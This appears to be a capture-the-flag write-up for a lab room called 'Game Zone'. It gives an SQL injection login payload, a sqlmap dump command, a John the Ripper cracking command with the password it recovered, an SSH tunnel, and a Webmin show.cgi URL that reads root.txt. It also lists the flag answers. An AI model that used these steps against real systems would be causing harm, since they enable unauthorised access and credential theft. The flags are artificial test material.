# Note for the room Game Zone 

## Tasks 

### Task 1 

What is the name of the large cartoon avatar holding a sniper on the forum?

```
Agent 47
```

### Task 2

Use `' or 1=1 -- -` as your username and leave the password blank.

When you've logged in, what page do you get redirected to?

```
portal.php
```

### Task 3 

Intercept the request with burpsuite and save the request to text file. Use sqlmap like so:

```
sqlmap -r test_req.txt --dbms=mysql --dump
```

In the users table, what is the hashed password?

```
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```


What was the username associated with the hashed password?

```
agent47
```

What was the other table name?
```
post
```

### Task 4

Crack the pass with johntheripper:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

ANSWER: videogamer124

SSH to the machine to get the flag

```
649ac17b1480ac13ef1e4fa579dac95c
```

### Task 5


How many TCP sockets are running?

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                                        Local Address:Port                                                       Peer Address:Port              
udp   UNCONN     0      0                                                         *:10000                                                                 *:*                  
udp   UNCONN     0      0                                                         *:68                                                                    *:*                  
tcp   LISTEN     0      80                                                127.0.0.1:3306                                                                  *:*                  
tcp   LISTEN     0      128                                                       *:10000                                                                 *:*                  
tcp   LISTEN     0      128                                                       *:22                                                                    *:*                  
tcp   LISTEN     0      128                                                      :::80                                                                   :::*                  
tcp   LISTEN     0      128                                                      :::22                                                                   :::*  
```
ANSWER: 5

From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

What is the name of the exposed CMS?

ANSWER: webmin


What is the CMS version?

```
1.580
```

### Task 6

http://localhost:10000/file/show.cgi/root/root.txt